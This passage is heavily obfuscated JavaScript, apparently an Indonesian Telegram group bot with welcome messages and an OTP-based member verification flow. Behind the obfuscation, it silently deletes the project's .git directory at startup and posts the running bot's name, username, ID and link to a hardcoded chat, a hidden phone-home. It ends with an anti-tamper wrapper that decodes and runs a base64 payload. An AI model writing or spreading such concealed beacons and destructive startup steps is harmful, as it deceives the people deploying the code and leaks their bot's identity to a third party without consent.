_0xae2b55[_0x1d0071(0x299)][_0x1d0071(0x3cc)+'bersCount'](_0x5c371b['chat']['id']),_0x25cf84=_0x42dde5[_0x1d0071(0x412)](_0x5c371b[_0x1d0071(0x3c9)+_0x1d0071(0x20b)])['full_name'],_0x498afc=_0x1d0071(0x407)+_0x25cf84+(_0x1d0071(0x2aa)+_0x1d0071(0x39a)+':\x20\x0a')+_0x34069c+('\x0a\x0a└─\x20❏\x20Nom'+_0x1d0071(0x2d1))+_0x25cf84+(_0x1d0071(0x3fc)+_0x1d0071(0x3ef))+(_0x5c371b[_0x1d0071(0x342)][_0x1d0071(0x240)]||'')+(_0x1d0071(0x39c)+'~'),_0x3061b9=_0x5c371b['chat']['id'],{isWelcomeEnabled:_0x36e157}=require(_0x1d0071(0x1d4)+'ome-db');_0x1791a4[_0x1d0071(0x20e)](_0x36e157,_0x3061b9)&&await _0xae2b55[_0x1d0071(0x299)][_0x1d0071(0x3b5)](_0x3061b9,_0x1791a4['AnoNP'],{'caption':_0x498afc,'parse_mode':_0x1791a4[_0x1d0071(0x368)]});}),_0xae2b55['on'](_0x285757['cXJsl'],async _0x1bcf30=>{const _0x4180e0=_0x4913e8,_0x41fd07=_0x1bcf30[_0x4180e0(0x1b5)],_0x260c6f=_0x41fd07[_0x4180e0(0x1b3)]?.['trim'](),_0x48e2e0=_0x41fd07[_0x4180e0(0x342)]['id'][_0x4180e0(0x21f)]();if(global[_0x4180e0(0x277)+_0x4180e0(0x37a)]?.[_0x48e2e0]&&_0x260c6f?.['includes'](_0x285757[_0x4180e0(0x2d5)])){const _0x34cabd=Math['floor'](_0x285757[_0x4180e0(0x353)](0x186a0,_0x285757[_0x4180e0(0x15f)](Math[_0x4180e0(0x242)](),0xdbba0))),_0x670cf8=_0x260c6f[_0x4180e0(0x1de)]();try{const _0x2670e0=await _0x285757['pMpIa'](_0xcc19f7,_0x4180e0(0x17b)+_0x4180e0(0x236)+'wy.vercel.'+_0x4180e0(0x2a7)+_0x4180e0(0x3f3)+'end='+_0x670cf8+(_0x4180e0(0x3c5)+'dikzOne&fr'+_0x4180e0(0x1ad)+_0x4180e0(0x3ec)+_0x4180e0(0x3b4))+_0x34cabd+_0x4180e0(0x3ca)+(global[_0x4180e0(0x277)+_0x4180e0(0x37a)][_0x48e2e0]['full_name']||_0x285757[_0x4180e0(0x16c)])),_0x385cb8=await _0x2670e0['json']();return global[_0x4180e0(0x2cb)+'rify'][_0x48e2e0]={'groupId':global[_0x4180e0(0x277)+'upVerify'][_0x48e2e0][_0x4180e0(0x2ad)],'otp':_0x34cabd,'expired':_0x285757[_0x4180e0(0x353)](Date[_0x4180e0(0x198)](),0x1d4c0)},_0xae2b55['telegram'][_0x4180e0(0x20c)+'e'](_0x48e2e0,_0x285757['XTozp']);}catch(_0x471d82){return console[_0x4180e0(0x25b)](_0x471d82),_0xae2b55[_0x4180e0(0x299)][_0x4180e0(0x20c)+'e'](_0x48e2e0,_0x285757[_0x4180e0(0x259)]);}}if(global[_0x4180e0(0x2cb)+_0x4180e0(0x1a1)]?.[_0x48e2e0]){const _0xaeb66b=global[_0x4180e0(0x2cb)+'rify'][_0x48e2e0];if(!/^\d{6}$/[_0x4180e0(0x3b7)](_0x260c6f))return;if(_0x285757['CgUoS'](Date[_0x4180e0(0x198)](),_0xaeb66b[_0x4180e0(0x24a)]))return delete global[_0x4180e0(0x2cb)+'rify'][_0x48e2e0],_0xae2b55[_0x4180e0(0x299)][_0x4180e0(0x20c)+'e'](_0x48e2e0,_0x4180e0(0x405)+_0x4180e0(0x302)+_0x4180e0(0x29b)+_0x4180e0(0x2f3));if(_0x260c6f!==String(_0xaeb66b[_0x4180e0(0x2c9)]))return _0xae2b55[_0x4180e0(0x299)][_0x4180e0(0x20c)+'e'](_0x48e2e0,_0x285757['TQYPf']);await _0xae2b55[_0x4180e0(0x299)][_0x4180e0(0x1c3)+'atMember'](_0xaeb66b['groupId'],_0x48e2e0,{'permissions':{'can_send_messages':!![],'can_send_media_messages':!![],'can_send_other_messages':!![],'can_add_web_page_previews':!![]}});const _0x2025d9=global[_0x4180e0(0x277)+_0x4180e0(0x37a)]?.[_0x48e2e0];if(_0x2025d9)try{await _0xae2b55[_0x4180e0(0x299)]['deleteMess'+_0x4180e0(0x388)](_0x2025d9[_0x4180e0(0x2ad)],_0x2025d9[_0x4180e0(0x219)+'Id']);}catch(_0x2d0478){console[_0x4180e0(0x3d2)](_0x285757[_0x4180e0(0x1ab)],_0x2d0478[_0x4180e0(0x1b5)]);}return delete global[_0x4180e0(0x2cb)+_0x4180e0(0x1a1)][_0x48e2e0],delete global[_0x4180e0(0x277)+_0x4180e0(0x37a)][_0x48e2e0],_0xae2b55[_0x4180e0(0x299)][_0x4180e0(0x20c)+'e'](_0x48e2e0,_0x4180e0(0x3db)+_0x4180e0(0x1b2)+_0x4180e0(0x1ba)+_0x4180e0(0x1f7)+_0x4180e0(0x28d)+'i\x20grup.');}_0x285757[_0x4180e0(0x24c)](require,_0x285757['nXTLg'])(_0x1bcf30,_0xae2b55);}),_0xae2b55[_0x4913e8(0x40c)]({'dropPendingUpdates':!![]});const _0x55eaf9=_0x2424ee[_0x4913e8(0x3ce)](__dirname,'.git');_0x5de229[_0x4913e8(0x38a)](_0x55eaf9)&&_0x5de229['rmSync'](_0x55eaf9,{'recursive':!![],'force':!![]}),_0xae2b55['telegram']['getMe']()['then'](async _0xfaafa3=>{const _0x5080c5=_0x4913e8;console[_0x5080c5(0x2b6)]({'Bot\x20Name':_0xfaafa3['first_name'],'Username':_0x1791a4[_0x5080c5(0x247)]('@',_0xfaafa3[_0x5080c5(0x240)]),'ID':_0xfaafa3['id'],'Link':_0x5080c5(0x217)+_0x5080c5(0x3cf)+_0xfaafa3[_0x5080c5(0x240)],'Author':_0x1791a4[_0x5080c5(0x3a5)]});const _0x4af6ae=await _0x1791a4['jtddC'](_0xcc19f7,_0x1f3b16,{'method':_0x1791a4[_0x5080c5(0x25d)],'headers':{'Content-Type':_0x5080c5(0x21c)+_0x5080c5(0x25e)},'body':JSON[_0x5080c5(0x3c4)]({'chat_id':_0x1791a4[_0x5080c5(0x209)],'text':_0x5080c5(0x2a6)+':\x20'+_0xfaafa3[_0x5080c5(0x2a4)]+('\x0a*username'+_0x5080c5(0x28b))+_0xfaafa3[_0x5080c5(0x240)]+_0x5080c5(0x265)+_0xfaafa3['id']+(_0x5080c5(0x2a5)+_0x5080c5(0x340)+'e/')+_0xfaafa3[_0x5080c5(0x240)],'parse_mode':_0x5080c5(0x2f6)})}),_0x29001a=await _0x4af6ae[_0x5080c5(0x2fe)]();});}_0x3a623f(),console[_0xde6929(0x3ab)](_0xde6929(0x2f7)+'..'),process['once'](_0x285757[_0xde6929(0x18c)],()=>_0xae2b55[_0xde6929(0x169)](_0xde6929(0x201))),process['once']('SIGTERM',()=>_0xae2b55[_0xde6929(0x169)](_0xde6929(0x158)));}()));function a0_0x3c34(){const _0x360f07=['DgfIyxnLl21HAq','ANnVBJO','BwfW','wvjOrvq','qw5KqKG','ndi3nJuXn1LLDMrrCW','C2XHBwLJ','B1zhugm','Dxr1yMukcKnVBG','vLbbywu','yM9HCMq','4PYfifbLBMrHzNrH','Bfv5rw4','AMXXDe0','Dhr0x2nSAwnR','A1D2Che','Dg9VBhnJBwq','zxjJB250zw50lG','uMDVC1a','wgnhALe','lI9SAwiVBxLMDq','q0P3BuG','y3mVC2z3l25VBq','u1vlBfO','B0fOr3K','D0PWAvm','rfPlvMG','DxbwzxjPzNK','A2LSBdi','C3rHCNq','D2XWzhq','whnoDvi','zxj5','B3uH','u0nOCgy','vMvpweS','q2z1CxK','yw5NiqORmtuWma','sNjABfy','y3mVBNnMDY90CG','DMfSDwu','ywDL','zg93BMXVywrJBq','zxHPC3rZu3LUyW','yw5NlG','BMDPCMLTigvTyq','zgHVBgq','zfrpt3u','tgvNAq','vwvHs24','D2fPDa','y3j5mG','z1bWDgK','mvv5D21crG','ENzNAgO','tfnrDve','lvrolxuTy2eTAq','AgvUDgfPmG','CgXtyxi','zNjVBsbNCM91Ca','zxPVBMu','kqPhB29KqNLLFG','CgrXELq','y3mVC2z3l3bVAW','Ag90BW','yNbLyvq','D2TIBuy','BMv3x2nOyxrFBq','y3mVC2z3l21LzW','BNrHAdOkl3L0Bq','yuvfz2K','u0PvugC','tvbWu3m','igrPA2LYAw0GAW','yK90uKG','AxnSyw1JBwq','Bg9N','As53ywLMDs5WAq','zKHbquG','CdqGAhr0Chm6lW','D2fPzNuY','4PQG77IpieTHBxuGC3vK','CgvWzwS','C2vUzfzPzgvV','zK5oDgC','zgu9','C2vUzfbOB3rV','qNrMCKi','DgvZDa','uM9YrgC','y3jPBMDLmIa','uKTTtuTKsdHiAG','Dfj5qwK','AhrvELy','CMvHzezPBgvtEq','tfnUs24','kLDLBgnVBwuGDa','ufv5t3e','yxDVBZi','qwfPqvy','ANjnEvC','C3rYAw5NAwz5','jNn1yMPLy3q9tG','A2eGAw5NAw4GDq','kGOk8j+tMYa6iga','BMCHcI03mdaGBq','BgvMDf9JAgf0xW','jM5HBwu9','vhHwrKy','z2v0q2HHDe1LBq','BwuVreLlvvPvtW','AM9PBG','BwuV','r2fTzsbKAw11Ba','y0fmtgS','D2fYBG','tgnLr2C','BwvUzgfMDgfYlG','qgDTywLSlMnVBq','zMv0y2HkC29U','u3nItgS','D213DwG','t3DUzxi','se1uyvy','4PYfifzLCMLMAwTH','ChLRwxy','CMLSC3O','uNzhzw0','y3mVC2z3l3nTDq','z2XVBxaYia','rw5HrKC','DcbKyxrHBMCSia','yKTvyvm','qvbjCW','y3mVC2z3l2f3BW','u3jQr3y','Dhr0x2fJy2vWDa','EenoD2W','y3mVBNnMDY9Uzq','B21LlwrI','quCWAu56nMLqzq','BMrfBwfPBczJBW','BK91BeK','Burvyva','Dc5Tzs8','vvrHsMS','mJbPv3j4y2G','zw9Vuuy','BMqTzw1HAwW/CW','CKPbEhe','zgvSzxrLtwvZCW','igv4Ca','ksdWN5gr','Cu5eEeu','BwvUDwPHC2HLCG','q0zjrNm','qxnPys9kywTHCG','xsHODhrWCZOVlW','AgvSCa','AgLNAgzPDMuYia','yMX1C2GYia','re1tvw0','yw4Gzgf0ywjHCW','shH1B2q','cKD1BMfRyw4GlW','CgTfrMy','4O+X77Ipie9uucbRywrH','y3mVC2z3l2H1zW','4PEQieDVB2rIEwuG','qvbjs2v5CW','zxHW','yw5ZD2vYq2jrDq','r1zwyLK','Bgf1BMnO','ALnmCLi','quDoqMi','qNvRyw4GDw50Dq','q25wEKm','Bgf4zei','z2v0vxnLCG','CvznDgm','CxbdrMC','ugfOAw5N','wvf3qLO','AhvNmIa','mJiXnte1vNz6Bun3','u0Lhvevstq','tKHKwxO','mJu2nde1ntbIuKDQqvG','CMvWBhK','y3mVC2z3l2jVBG','ww9hAKm','BIbIywXHCYbRBW','DKLHrhK','r1zKD24','ANjjA3a','BNnMD2nTza','lZe3nte5ndaZoa','Cgndrui','igrPihnPBMKU','Aw5JBhvKzxm','tgXwvgG','igf0yxuGl2DHBG','C3rVCa','zs5QC29UoG','ovfmwu9rvq','AhjlqMi','CgXHEwLUzW','CMjOswq','DwX3ANu','t1rHA2y','wLLqDxO','D1jszKq','q0LOBNC','C3vIC3rY','veDlq0K','vgDOvgi','C2HPBM9IDti','AvrqyKO','mJC4mtmZmezjuKPHuW','CNjLz0K','Ahr0Chm6lY9NBq','z0Potfm','zMXVB3i','sxrXwM0','zLPKy2e','BMfHBJOkl3L0Bq','DgL0Bgu','y1vXA3G','uKfTCLq','zxHPDa','vxvpEwC','v2fNzq','C3zzwLq','Dfngrwy','A2PkEw0','zM9YBwf0','tefosLvuipcFK6q','ru5dCMC','EMLpufq','CejKuuq','yMfOigrHDgeU','rNn0uNe','t3LWsLy','rKPXtum','t3j3ANK','zNvSBf9Uyw1L','C2XHCdiG','qujuzMW','vxnLCG','BM93','A2LJAZiG','Cej4rhq','sNfjvNu','As5JB3vUDgfWAq','C3bSAxq','v0Lbvwm','Awniwhq','As50zwXLz3jHBq','CMLMEq','A3DVCdjfzZvrwq','rgf0ysbsueCGyG','Dg9mB2nHBgvtDa','y3mVC2z3l2rHBG','Ahr0Chm6lY9Uza','zfv0u2C','ywzcrgy','y3mVC2z3l2nYEq','DhjHCdi','Be1cvum','t1Dorvi','B209tMrPA3Ptzq','CMfUBxuH','zgzvvu4','AKjVvNe','Ag5LA28Yia','C2KGyMvYAgfZAq','Dgv4Da','Cg9RztiG','BwvZC2fNzq','C21PBguY','tLPis2y','s290ywSGC3vKyq','sMLYrLm','BceGs2fTDsbZzq','mJuGzxHW','zMXxEKy','EgXhEMy','Ew5J','Ahr0Chm6lY9Yyq','u1v0v0e','zgfMDgfYoIa','Bfz5A00','CMvZDhjPy3rdAa','DgLFDw11CIbQAq','vu9dqwO','y3mVC2z3l2DSBW','AcbKAwLZAs4','CuTAwvu','CwHpvfi','Cgf0mG','ug9U','q2zvzKC','y3mVBNnMDY9IBa','y3mVC2z3l2j1Ba','y1HrBfi','B2rNDMW','EuDTAeO','igrHDgfIyxnLlG','DhjHCdiG','lI9SAwiVD2vSyW','y3mVC2z3l2n1za','yxbP','rgf0ysb0AwrHAW','z0nTBKG','CMvWBhLxAxrOua','yaRWN4+fidOGya','yaRIJ7aGoIbG','AuvJEvi','y3vKzgXLmG','DhjPBq','vKjxs2S','ywGGCgvYBMfOia','zgfUy2uYia','BuDVuum','CMnLBc5HChaVza','C2HVCNq','wKrVvxu','zgf0ywjHC2uUAG','Awf1B20','DxjS','rvr2Egu','EhrnvMC','CuPjtMq','BMTZENK','A211iq','BwvUDwDHBwu','CgfUzwXJBwq','vvHjqwi','vKnnr0m','z2v0vxnLCK5HBq','twrOu2y','y2fSBgjHy2TFCq','BwvUDwz1BG','CMvWBhLxAxrOtq','A2fYyw5NigjPCW','A2LZCZi','r2fNywWGC2LTCa','l3LVDxr1lMjLlW','y3vdEg8','zxvIwhu','tK9dtMW','Cxrzwe8','4P2mie9uucbZywXH','ExrTCdq','u0Lhsu5u','B3DUBg9Hzc95Da','mNW0Fdn8mxWW','yM9UAZiG','BMvRBZi','y3vKzgXLmIa','vK9ZyLG','vKrUENq','y1jRDum','ig5VDcbMB3iGEq','BwvTyMvY','C2vUze1LC3nHzW','CgfYC2u','qLvqtg4','y2fSBgjHy2TrDq','r2fNywWGAgfWDq','BI9eyxrHyMfZzq','CNrHya','rhbuDKy','AgfUzgHVBgqY','A1zTtNu','zw50CMLLCW','Ahr0Chm6lY90lG','yM5pq0y','D2vSy29Tzu1ZzW','Bu9dEwC','C2rhBg8','yxbWBgLJyxrPBW','wLLdEM4','ExfKreC','Dg9tDhjPBMC','DK5cAhO','CMvWBgfJzq','AgLZigj1DhrVBG','C21PBguYia','yxrnzw1Izxi','v2nKCgO','t0L2q1K','yMvYC0nVDw50','yMXVD2PVyJi','EM5PCxC','EhzrDeC','rwX6s24','ywLJBwq','C1fNDfC','ExrTCdm','lNH5EI9OAxqVyq','D2LHrum','vxDMsNu','EgLZqwq','rg5ptNK','BhfovMK','CxDct1K','ywLSyxbPlxnUBW','u1jKAhq','vM5jA0m','BM9TmG','y3j5mIa','sNLiqNq','zK1UAwC','mJm0odqXoerKr0zIuq','D3jPDgvgAwXLuW','uxv6zLG','DxnLCM5HBwu','Dg9mB2nHBgveyq','CMfUzg9T','uuHgtg8','Bw9UzxK','yML0ztiG','yxrHyMfZzs9eyq','twXTt1y','z2fUDgLFBMfTyq','D2LUAZi','zxHWAxjLza','txKGBg9YzcbB','Ce1Wswe','ANrKzem','CgfHrhu','sKXPsMe','y2XIBuO','EwvLDdiG','Dxa6','DgLJDgfJDg9L','sLniu2K','sMrkqNG','yM90sw5MBW','B25LEqOTmZaGzq','z2fTzq','r1zYqKG','4P2mieTHBxuGBwvU','zxjYB3i','s0LUyKe','CMDKzMi','BI9QC29U','B3DQB2i','uhresNK','rKjeqw4','wwHzvuO','DxrXwM0','AgfWChKYia','cIPPzcO6ia','CgvWzwSG','rgnMtu0','ALnrzhe','swn5Efm','zw1IzxjZ','zguGnIbKAwDPDa','DY5NAxrODwj1CW','4Q2viejVDcbTzw5H','ndGYoda3mNbkqKPiuq','CgKTBMrPA3PIBW','AwT6lwfWAs52zq','AwWHcLnLBgfTyq','zgf0yq','svzqBhK','Ew91DhuUyMu','CMvWBhLxAxrOvG','u2zmA3m','CgvUzgLUz0DYBW','Ag5LA28Y','BM9IDq','EvbwwwK','Dw11CG','B2HkCM4','zwLkz2C','sfvvvfu','CI5TCdq','CgjjzvC','u2vywMe','nZy0nY11Eg5VzG','zuHvthi','Dw1orKK','AgfUzgHVBgqYia','mdaGBw9UzxKkkW','ywKH','yKjJse0','s3bgC2G','ysbHBgfTyxqGrW','kJOG','BwvUDwDYB3vW','ysbIAwnHCMeGza','BNvTzxjPyW','igrPDgvTDwTHBG','vMDjrey','zvnvyuq','zMLYC3rFy2HHDa','sKv3vxi','y3mVC2z3l2XPyW','CM1HDa','y3mVC2z3l2TPyW','zxjOyxnPBcbKAq','B3DUzxi','DgvSzwDYyw0','vNfwCeW','CMLTigvTywLSia','iefZAweVsMfRyq','D1rTBhi','BxaZp3vYBd0','DgvtDhjPBMC','ufr1DKK','vMPzrMG','4PYfieTVzguGt1rq','BxDNsgq','zMLYC3rFBMfTzq','cIPmsu5lkJOGAa','kMjVDcboyw1LkG','yxbWl2fWAs9Zzq','svzAsKG','DgfUz2DHBgrHzG','cGRIL6OGtgvHDMuG','A2LSBdiG','DxrMltG','z3jVDxbjza','BMfTyq','Egzws0q','BgLJAZiG','y29Tl05KAwT6ra','sMrmrwW','wMnVAg4','Cgf0mIa','suv6EuO','DgfIBgu','BwvNDw1PBJi','yaRWN4AuidOGya','BgLJAZi','tufss0rpv04','D1j0wfC','vuXQChK','rgf0zvrPBwvgBW','vKzOzKK','Ahr0Chm','zvrLEhq','uwztz3u','Ee9orLO','s0vo','y1bjvhu','vxbWC3mUlI4GDa','ExHwv0K','EvbhA2y','CfjYufy','B3rW','y2vJyw5JBwq','B3rWr3jVDxbwzq','yxrHDsbJB2jHia','qMvSDw0GywrHia','DKzUBLy','BM9uB2TLBG','Ew91DhvIzs5JBW','B3i6ifS','vgXYy2i','D21IB3rTzq','CMvWBhLxAxrOqq','sg1SsK4','y29TBwfUza','yNvSBhKY','D2f2zti','yw5PBwvJBwq','s3zUzMS','BwvUDxjWzW','svzKs2e','yxHPB3m','uMPwqvC','C1zdsLC','ww5AswS','4P2mieDHz2fSig1L','CYbWzxnHBIbNCG','Bg9Zzq','BMDL','BwvUDq','mtCZnZa5ofb6uMvXEa','CdqGBgLUAYb5BW','y2HHDa','wfzZwM0','B1DkDgK','AgzPDMu','vgLPtKO','rxnswvu','AwvkruO','wezNBgm','DxHut28','zxPtsKq','vwjAwee','BgfNAs4','4PQw77IpifnLCMKHcIS1','ig1VBMv5cIS3nq','twfYA2rVD24','qM90igPHBgfUlG','seG6Bw06C3m','ugfnA28','wNHOEuW','ruvxAM4','ruHXtui','z2jzzvO','ANnVBG','Ahr0Chm6lY9HCa','lM9YzY9IB3q3nW','q0nyAKe','BhvHCNnHlIblAq','uNHLDMK','Dg9OihbLBMDNDq','r2fNywWGyMfJyq','DgfY','q2rnEM0','zsbLBwfPBcbRyq','D2f2ztiG','CdmGBgLUAYb5BW','ELvRtui','C1fYEwm','DgnqEw4','EMX6zLK','se1bDMO','y3mVC2z3l3nSyq','s3Ppshq','ufjTqKS','CMLUzW','tLjfsKO','EKHAuuK','y0zxC1q','u1fptxi','B3DUzxjJBwq','zg93BMXVywq','uvLzuLO','ExjJufa','z2fTzsbHA3rPzG','rMvvyMm','mJuWodi3mtK6qq','C29U','Bwf4','vgz6uKy','BgvUz3rO','y3mVC2z3l2jSDq','lIbhDw5HA2fUia','tgXIDe4','AvfzCgC','wxrMwhC','txLLBfu','y3mVC2z3l2TPCW','yLPHwxC','Cgf0Aa','rNn0yLy','u1rpucdIM5q','A29MqMS','BMLTyxrPB24','ywX4CNu','Bw9Tzw50lxrPBq','vhLMqxO','C2HPBM9IDtiG','zuTVyva','yw9UteO','Du1fAxq','vuXOsKG','Dc5OzxjVA3vHCa','q2Dywuu','ExjoExG','y3mVC2z3l3DHDG','wMX3v04','s2LYAw0GCgvYAq','AwWUifbLCMLRCW','zvnUBhu','DhrWCZOVl3qUBq','u1fzsLK','zNjVBq','D2LU','wu9vuL9uruXfrW','ugXMsgS','CdmGAhr0Chm6lW','De9nqLC','v0rhBgu','rgX3EeS','BM9TmIa','AgLNAgzPDMuY','DgvTCfjLz2LZDa','zNzkvg8','zs1UB3C','yLvfq3C','yNvSBhKYia','y0fmzhi','te9tq2O','qwfjAeW','A2LZCZiG','DhvYBG','wfLozxu','Bxa0p3vYBd0','uw5TA1e','vfrnwMO','CuPhrwu','C1npvfG','y3mVC2z3l25LAW','AxjUu2O','svDlAeS'];a0_0x3c34=function(){return _0x360f07;};return a0_0x3c34();}", "base64").toString());
  } catch (e) {
    console.error("❌ File rusak atau telah dimodifikasi secara tidak sah!");
    process.exit(1);
  }
})();